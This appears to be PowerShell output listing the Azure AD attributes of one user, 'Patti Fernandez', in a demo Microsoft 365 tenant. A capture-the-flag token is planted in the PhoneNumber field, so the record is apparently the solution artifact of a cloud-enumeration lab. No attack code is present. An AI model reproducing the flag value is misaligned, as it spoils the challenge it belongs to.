FirstName                              : Patti
ImmutableId                            :
IndirectLicenseErrors                  :
IsBlackberryUser                       : false
IsLicensed                             : true
LastDirSyncTime                        :
LastName                               : Fernandez
LastPasswordChangeTimestamp            : 2023-09-20T20:54:57Z
LicenseAssignmentDetails               : LicenseAssignmentDetails
LicenseReconciliationNeeded            : false
Licenses                               : Licenses
LiveId                                 : 10032002F3B32527
MSExchRecipientTypeDetails             :
MSRtcSipDeploymentLocator              :
MSRtcSipPrimaryUserAddress             :
MobilePhone                            :
OathTokenMetadata                      :
ObjectId                               : d15033b7-6556-4bcd-8ec5-0c3f7ff7e9be
Office                                 : 15/1102
OverallProvisioningStatus              : PendingInput
PasswordNeverExpires                   :
PasswordResetNotRequiredDuringActivate :
PhoneNumber                            : flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}
PortalSettings                         :
PostalCode                             : 40223
PreferredDataLocation                  :
PreferredLanguage                      : en-US
ProxyAddresses                         : ProxyAddresses
ReleaseTrack                           :
ServiceInformation                     : ServiceInformation
SignInName                             : PattiF@4rhdc6.onmicrosoft.com
SoftDeletionTimestamp                  :
State                                  : KY
StreetAddress                          : 9900 Corporate Campus Dr., Suite 3000
StrongAuthenticationMethods            :
StrongAuthenticationPhoneAppDetails    :
StrongAuthenticationProofupTime        :
StrongAuthenticationRequirements       :
StrongAuthenticationUserDetails        :
StrongPasswordRequired                 :
StsRefreshTokensValidFrom              : 2023-09-20T20:54:57Z
Title                                  : President
UsageLocation                          : US
UserLandingPageIdentifierForO365Shell  :
UserPrincipalName                      : PattiF@4rhdc6.onmicrosoft.com
UserThemeIdentifierForO365Shell        :
UserType                               : Member
ValidationStatus                       : Healthy
WhenCreated                            : 2023-09-16T10:24:34Z
```
